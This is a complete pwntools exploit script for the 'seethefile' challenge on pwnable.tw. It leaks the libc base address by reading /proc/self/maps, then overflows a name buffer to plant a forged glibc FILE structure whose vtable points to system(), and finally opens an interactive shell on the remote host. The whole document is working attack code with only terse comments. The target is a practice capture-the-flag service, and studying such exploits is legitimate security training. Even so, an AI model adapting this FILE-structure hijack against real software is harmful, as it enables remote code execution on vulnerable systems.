from pwn import *
from FILE import *
context.arch = 'i386'
elf = ELF('seethefile')
libc = ELF('libc_32.so.6')
io = remote('chall.pwnable.tw',10200)
#io = process('./seethefile',env={"LD_PRELOAD":"libc_32.so.6"})

def openfile(File):
    io.sendlineafter("Your choice :", "1")
    io.sendlineafter("see :", File)

def read():
    io.sendlineafter("Your choice :", "2")

def write():
    io.sendlineafter("Your choice :", "3")

def close():
    io.sendlineafter("Your choice :", "4")

def iexit(name):
    io.sendlineafter(" :", "5")
    io.sendlineafter(" :", name)

openfile('/proc/self/maps')
read()
sleep(1)
write()
io.recvuntil('[heap]\n')
libc_base = int(io.recv(8),16)+0x1000
info('LIBC BASE -> %#x'%libc_base)
close()

fake_fp = elf.sym['fp']+0x4

payload = '\x00'*0x20
payload += p32(fake_fp)
ff = IO_FILE_plus_struct()
ff._flags = u32('\xff\xff\xdf\xff') 	# keep the fp._flags
ff._IO_read_ptr = u32(';$0\x00') 	# $0==bash and `;` to split commands
ff.vtable = fake_fp+0x98
payload += str(ff)
payload += p32(0)*2
payload += p32(libc.sym['system']+libc_base)*19

iexit(payload)

io.interactive()

